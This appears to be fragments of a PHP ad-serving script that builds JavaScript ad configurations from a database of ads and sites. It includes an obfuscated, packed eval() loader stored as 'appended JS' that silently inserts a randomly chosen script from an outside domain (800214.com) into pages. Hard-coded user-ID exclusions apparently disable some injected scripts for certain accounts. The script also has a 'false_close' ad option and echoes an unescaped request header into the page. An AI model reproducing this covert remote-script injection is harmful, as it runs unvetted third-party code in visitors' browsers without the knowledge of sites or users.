...
b.priority,b.resuid,b.checkplan,b.sitelimit,b.limitsiteid,b.class_id,b.run_terminal,b.plan_name,b.type FROM lz_ads AS a
...
if($id==9856){
    $List['imageurl'] = str_replace('img.miaoceshi','jnh.miaoceshi',$List['imageurl']);
}
...
if($http_type==TRUE){
    if(strpos($List['imageurl'], 'img.miaoceshi') == true){
        ...
        if(stristr($_SERVER['HTTP_USER_AGENT'], 'MiuiBrowser')){
            $List['imageurl'] = str_replace('img.miaoceshi','xfo.miaoceshi',$List['imageurl']);
        }else{
...
?>  
    var imgdomain = "<?php echo $_SERVER['HTTP_RHOST'];?>";
 
    var <?php {echo $stytlename;}?>blogs = {"imageurl":"http://"+imgdomain+"<?php if (!empty($List)) {echo $List['imageurl'];} ?>",
 
    "basedUrl":"<?php if (!empty($List)) {echo $baseUrl;} ?>",
    "htmlcontrol":"<?php if (!empty($List)) {echo $htmlcontrol[0];} ?>",
    "showType":"bottom",
    "styCss":"<?php if (!empty($List)) {echo $styCss;} ?>",
    <?php  if(!empty($List['text_chain'])){ ?>
        "textChain":"<?php if (!empty($List)) {echo $List['text_chain'];} ?>"
    <?php  }?>
    };
    var <?php {echo $stytlename;}?>config = {"width":"<?php if (!empty($List)) {echo $List['width'];} ?>",
    "ad_id":"<?php if (!empty($List)) {echo $rand;} ?>",
    "adz_id":"<?php if (!empty($List)) {echo $id;} ?>",
    "site_id":"<?php if (!empty($List)) {echo $siteRes[0]['site_id'];} ?>",
    "height":"<?php if (!empty($List)) {echo $List['height'];} ?>",
    "flag":"<?php echo $flag; ?>",
    "false_close":"<?php if (!empty($List)) {echo $List['false_close'];} ?>",
    ...
    <?php if($id != 9841){
    echo 'var type = '.$stytlename.'blogs.imageurl;';
    }?>
    ...
    var false_close = <?php {echo $stytlename;}?>config.false_close;
    var ad_id = <?php {echo $stytlename;}?>config.ad_id;
    var pid = <?php {echo $final_pid;} ?>;
    var adz_id = <?php {echo $stytlename;}?>config.adz_id;
    var site_id = <?php {echo $stytlename;}?>config.site_id;
    // top类位置样式
    var showType = <?php {echo $stytlename;}?>blogs.showType;
    var styCss = <?php {echo $stytlename;}?>blogs.styCss;
    //插屏广告间隔时间
    var adminutes = <?php echo $minutes;?>;
...
$randsuijia = rand(0,9);
    ...
    if($uid==5564||$uid==5718||$uid==6353||$uid==6126||$uid==6319||$uid==5963){
        $iqiyi_eval_js = '';
        $iqiyi_eval_js_test = '';
    }
    ...
    $fujia_js_http = ";eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('(j(){1 b=4.7(4.9()*3);1 a=5.8(\"6\");1 c=[\"a\",\"b\",\"c\",\"d\"];a.e=\"f://g.h/\"+c[b]+\".i\";1 2=5.k(\"6\")[0];2.l.m(a,2)})();',23,23,'|var|s||Math|document|script|round|createElement|random|||||src|https|800214|com|js|function|getElementsByTagName|parentNode|insertBefore'.split('|'),0,{}));";
...
function getClickHeightFlag($id,$user_ip,$clickhight){
    ...
    if($adzNumNow >= $clickhight['adznum_6']){
        ...
        if($adzNumTwo == 'null'){
            $time = rand($clickhight['adzcycle1'],$clickhight['adzcycle2']);
            $time = empty($time) ? 1 : $time;
            if($time == 1){
